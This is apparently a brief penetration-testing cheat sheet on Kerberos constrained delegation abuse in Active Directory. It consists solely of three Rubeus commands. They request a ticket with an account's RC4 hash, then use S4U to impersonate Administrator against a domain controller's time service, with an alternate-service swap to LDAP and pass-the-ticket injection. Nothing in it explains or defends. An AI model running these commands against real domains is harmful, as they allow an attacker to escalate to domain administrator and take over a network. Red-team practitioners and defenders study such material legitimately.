# 🟢 Constrained Delegation

### Constrained Delegation with Rubeus

{% code overflow="wrap" %}
```
.\Rubeus.exe asktgt /user:svc_with_delegation /domain:targetdomain.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E
```
{% endcode %}

{% code overflow="wrap" %}
```
.\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:Administrator /msdsspn:time/dc /ptt
```
{% endcode %}

{% code overflow="wrap" %}
```
.\Rubeus.exe s4u /user:sa_with_delegation /impersonateuser:Administrator /msdsspn:time/dc /altservice:ldap /ptt /rc4:2892D26CDF84D7A70E2EB3B9F05C425E
```
{% endcode %}
